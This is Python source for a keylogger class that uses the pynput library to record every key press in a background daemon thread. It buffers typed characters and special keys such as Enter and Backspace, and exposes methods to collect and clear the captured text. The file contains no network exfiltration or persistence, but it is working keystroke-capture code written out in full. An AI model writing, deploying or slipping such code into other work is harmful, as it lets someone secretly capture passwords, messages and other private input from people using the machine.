import threading
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.log_buffer = []
        self.listener = None
        self.thread = None
        print("Keylogger: Initialized.")

    def on_press(self, key):
        try:
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                self.log_buffer.append(key.char)
            elif key == keyboard.Key.space:
                self.log_buffer.append(" ")
            elif key == keyboard.Key.enter:
                self.log_buffer.append("[ENTER]\n")
            elif key == keyboard.Key.backspace:
                self.log_buffer.append("[BACKSPACE]")
            else:
                self.log_buffer.append(f"[{str(key).replace('Key.', '')}]") # e.g., [shift], [alt]
        except AttributeError:
            self.log_buffer.append(f"[{str(key).replace('Key.', '')}]") # For special keys without .char
        # Optional: Print to console for debugging
        # print(f"Keylogger: Logged: {''.join(self.log_buffer[-5:])}") # show last 5 chars

    def start_listening(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            self.listener = listener
            listener.join()

    def start(self):
        if not self.thread or not self.thread.is_alive():
            self.thread = threading.Thread(target=self.start_listening, daemon=True)
            self.thread.start()
            print("Keylogger: Listening started in background thread.")

    def stop(self):
        if self.listener:
            self.listener.stop()
            print("Keylogger: Listener stopped.")
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1) # Give it a moment to terminate
            print("Keylogger: Thread joined.")

    def get_logs(self):
        """Returns the current accumulated logs as a string."""
        logs = "".join(self.log_buffer)
        return logs

    def clear_logs(self):
        """Clears the internal log buffer after it has been collected."""
        self.log_buffer = []
        print("Keylogger: Internal logs cleared.")